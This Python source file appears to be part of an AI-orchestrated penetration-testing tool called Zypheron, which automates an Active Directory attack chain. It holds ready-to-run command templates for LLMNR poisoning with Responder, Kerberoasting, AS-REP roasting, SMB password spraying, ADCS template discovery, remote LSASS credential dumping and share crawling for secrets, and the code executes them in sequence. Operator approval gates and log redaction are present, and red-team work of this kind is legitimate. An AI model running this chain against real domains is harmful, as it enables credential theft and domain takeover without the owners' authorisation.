"""
Zypheron Active Directory Attack Engine

AI-orchestrated AD kill-chain with operator approval gates.

Kill-chain (full mode):
  1. ldapdomaindump + PingCastle  (enum)
  2. BloodHound path mapping      (enum)
  3. Responder hash capture        (initial access) [APPROVAL REQUIRED]
  4. Impacket Kerberoasting + NetExec spray (exploitation) [APPROVAL REQUIRED]
  5. Certipy ADCS check            (exploitation) [APPROVAL REQUIRED]
  6. Isassy + Snaffler             (post-exploitation) [APPROVAL REQUIRED]
  7. Domain takeover               (post-exploitation) [APPROVAL REQUIRED]

Enum mode only runs steps 1-2 (safe, no exploitation).
"""

import asyncio
import json
import re
import shlex
import shutil
import subprocess
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional

from loguru import logger

from core.loot import LootManager


@dataclass
class ADStep:
    """A single step in the AD kill-chain."""
    name: str
    phase: str  # enum, initial_access, exploit, post_exploit
    tool: str
    command_template: str
    description: str
    requires_approval: bool = False
    requires_creds: bool = False
    mitre_technique: str = ""


# The full AD kill-chain
AD_KILL_CHAIN: List[ADStep] = [
    # Phase 1: Enumeration (safe)
    ADStep(
        name="LDAP Domain Dump",
        phase="enum",
        tool="ldapdomaindump",
        command_template="ldapdomaindump -u '{domain}\\{user}' -p '{password}' -d {output} {target}",
        description="Enumerate all users, groups, computers, GPOs, trusts from LDAP",
        requires_creds=True,
        mitre_technique="T1087.002",
    ),
    ADStep(
        name="PingCastle Health Check",
        phase="enum",
        tool="PingCastle",
        command_template="PingCastle --healthcheck --server {target} --no-enum-limit",
        description="AD vulnerability assessment with risk scoring and attack path visualization",
        mitre_technique="T1087.002",
    ),
    ADStep(
        name="BloodHound Collection",
        phase="enum",
        tool="bloodhound-python",
        command_template="bloodhound-python -u '{user}' -p '{password}' -d {domain} -dc {target} -c all --zip -o {output}",
        description="Collect AD relationships for attack path mapping",
        requires_creds=True,
        mitre_technique="T1087.002",
    ),

    # Phase 2: Initial Access
    ADStep(
        name="Responder Hash Capture",
        phase="initial_access",
        tool="responder",
        command_template="responder -I {interface} -dwPF",
        description="Capture NTLMv2 hashes via LLMNR/NBT-NS/mDNS poisoning",
        requires_approval=True,
        mitre_technique="T1557.001",
    ),

    # Phase 3: Exploitation
    ADStep(
        name="Kerberoasting",
        phase="exploit",
        tool="impacket-GetUserSPNs",
        command_template="impacket-GetUserSPNs -request -dc-ip {target} '{domain}/{user}:{password}' -outputfile {output}/kerberoast.txt",
        description="Request TGS tickets for service accounts and crack offline",
        requires_approval=True,
        requires_creds=True,
        mitre_technique="T1558.003",
    ),
    ADStep(
        name="AS-REP Roasting",
        phase="exploit",
        tool="impacket-GetNPUsers",
        command_template="impacket-GetNPUsers -dc-ip {target} '{domain}/' -usersfile {output}/users.txt -format hashcat -outputfile {output}/asrep.txt",
        description="Find accounts with Kerberos pre-auth disabled",
        requires_approval=True,
        mitre_technique="T1558.004",
    ),
    ADStep(
        name="NetExec Password Spray",
        phase="exploit",
        tool="nxc",
        command_template="nxc smb {target} -u {output}/users.txt -p '{password}' --continue-on-success",
        description="SMB credential spray across domain",
        requires_approval=True,
        requires_creds=True,
        mitre_technique="T1110.003",
    ),
    ADStep(
        name="Certipy ADCS Enumeration",
        phase="exploit",
        tool="certipy",
        command_template="certipy find -u '{user}@{domain}' -p '{password}' -dc-ip {target} -vulnerable -stdout",
        description="Find vulnerable certificate templates (ESC1-ESC13)",
        requires_approval=True,
        requires_creds=True,
        mitre_technique="T1649",
    ),

    # Phase 4: Post-Exploitation
    ADStep(
        name="LSASS Credential Dump",
        phase="post_exploit",
        tool="lsassy",
        command_template="lsassy -u '{user}' -p '{password}' -d {domain} {target}",
        description="Remote LSASS credential extraction via NetExec",
        requires_approval=True,
        requires_creds=True,
        mitre_technique="T1003.001",
    ),
    ADStep(
        name="Snaffler Share Hunting",
        phase="post_exploit",
        tool="Snaffler",
        command_template="Snaffler -s -d {domain} -o {output}/snaffler.log",
        description="Crawl SMB shares for credentials, configs, sensitive files",
        requires_approval=True,
        mitre_technique="T1039",
    ),
]


_SENSITIVE_PATTERNS = re.compile(
    r"(-p\s+|--password\s+|--hash\s+|:{1})(\S+)",
    re.IGNORECASE,
)


def redact_command(cmd: str) -> str:
    """Replace password/hash values in command strings with ***REDACTED***."""
    # Redact -p 'value', --password value, --hash value patterns
    result = re.sub(
        r"(-p\s+|-p=|--password\s+|--password=|--hash\s+|--hash=)('[^']*'|\"[^\"]*\"|\S+)",
        r"\1***REDACTED***",
        cmd,
    )
    # Redact inline credentials like domain\user:password in quoted strings
    result = re.sub(
        r"('{1}[^']*\\[^']*:)([^']+)(')",
        r"\1***REDACTED***\3",
        result,
    )
    return result


class ADEngine:
    """Orchestrate AD kill-chain with AI guidance and approval gates."""

    def __init__(
        self,
        session_id: str,
        target: str,
        domain: str,
        mode: str = "full",
        user: str = "",
        password: str = "",
        ntlm_hash: str = "",
        available_tools: Optional[List[str]] = None,
        ai_provider=None,
        approval_callback: Optional[Callable[[str], bool]] = None,
    ):
        self.session_id = session_id
        self.target = target
        self.domain = domain
        self.mode = mode  # "enum" or "full"
        self.user = user
        self.password = password
        self.ntlm_hash = ntlm_hash
        self.available_tools = available_tools or []
        self.ai_provider = ai_provider
        self.loot = LootManager(session_id)

        # Approval callback: returns True if operator approves the step
        # Default: always require approval (block if no callback)
        self.approval_callback = approval_callback or self._default_approval

    @staticmethod
    def _default_approval(step_description: str) -> bool:
        """Default approval: deny and log at ERROR. Callers must provide an explicit callback."""
        logger.error(f"APPROVAL DENIED (no callback): {step_description}")
        return False

    def get_kill_chain(self) -> List[ADStep]:
        """Get applicable kill-chain steps based on mode."""
        if self.mode == "enum":
            return [s for s in AD_KILL_CHAIN if s.phase == "enum"]
        return AD_KILL_CHAIN

    def get_executable_steps(self) -> List[ADStep]:
        """Filter kill-chain to only steps with installed tools."""
        chain = self.get_kill_chain()
        if self.available_tools:
            return [s for s in chain if s.tool in self.available_tools or shutil.which(s.tool)]
        return [s for s in chain if shutil.which(s.tool)]

    def build_command(self, step: ADStep) -> str:
        """Build the command string for a step."""
        output_dir = str(self.loot.get_path("ad"))
        cmd = step.command_template.format(
            target=self.target,
            domain=self.domain,
            user=self.user or "anonymous",
            password=self.password or "",
            hash=self.ntlm_hash or "",
            output=output_dir,
            interface="eth0",
            token="",
        )
        return cmd

    async def run_step(self, step: ADStep) -> Dict[str, Any]:
        """Execute a single kill-chain step with approval gate."""
        # Check approval for exploitation steps
        if step.requires_approval:
            desc = f"[{step.phase.upper()}] {step.name}: {step.description}"
            if not self.approval_callback(desc):
                self.loot.log_timeline("ad", "step_denied", tool=step.tool,
                                        detail=step.name, status="denied")
                return {"step": step.name, "status": "denied"}

        # Check credentials if needed
        if step.requires_creds and not self.user:
            self.loot.log_timeline("ad", "step_skipped", tool=step.tool,
                                    detail="No credentials provided", status="skipped")
            return {"step": step.name, "status": "skipped", "reason": "no_credentials"}

        cmd = self.build_command(step)
        self.loot.log_timeline("ad", "step_start", tool=step.tool,
                                detail=f"{step.name}: {redact_command(cmd)}")

        logger.info(f"AD Step: {step.name} ({step.tool})")
        try:
            result = subprocess.run(
                shlex.split(cmd), shell=False, capture_output=True, text=True, timeout=300,
            )
            output = result.stdout + result.stderr
            self.loot.save_loot("ad", f"{step.tool}_output.txt", output)

            status = "ok" if result.returncode == 0 else "error"
            self.loot.log_timeline("ad", "step_complete", tool=step.tool,
                                    detail=f"exit={result.returncode}", status=status)

            return {
                "step": step.name,
                "tool": step.tool,
                "phase": step.phase,
                "mitre": step.mitre_technique,
                "exit_code": result.returncode,
                "status": status,
            }
        except subprocess.TimeoutExpired:
            self.loot.log_timeline("ad", "step_timeout", tool=step.tool, status="error")
            return {"step": step.name, "status": "timeout"}
        except Exception as e:
            self.loot.log_timeline("ad", "step_error", tool=step.tool,
                                    detail=str(e), status="error")
            return {"step": step.name, "status": "error", "error": str(e)}

    async def run(self) -> Dict[str, Any]:
        """Execute the full AD kill-chain."""
        logger.info(f"AD attack: target={self.target}, domain={self.domain}, mode={self.mode}")

        self.loot.log_timeline("ad", "ad_attack_start", tool="zypheron",
                                detail=f"{self.domain} via {self.target}")

        steps = self.get_executable_steps()
        if not steps:
            return {"status": "no_tools", "message": "No AD tools available"}

        results = {
            "target": self.target,
            "domain": self.domain,
            "mode": self.mode,
            "steps": [],
            "mitre_techniques": [],
        }

        for step in steps:
            result = await self.run_step(step)
            results["steps"].append(result)
            if result.get("mitre"):
                results["mitre_techniques"].append(result["mitre"])

            # If a step fails critically, ask AI whether to continue
            if result.get("status") == "error" and self.ai_provider:
                # AI decides if the chain should continue
                logger.warning(f"Step failed: {step.name}. Continuing chain...")

        self.loot.save_loot_json("ad", "kill_chain_results.json", results)
        self.loot.log_timeline("ad", "ad_attack_complete", tool="zypheron",
                                detail=f"{len(results['steps'])} steps executed")

        return results
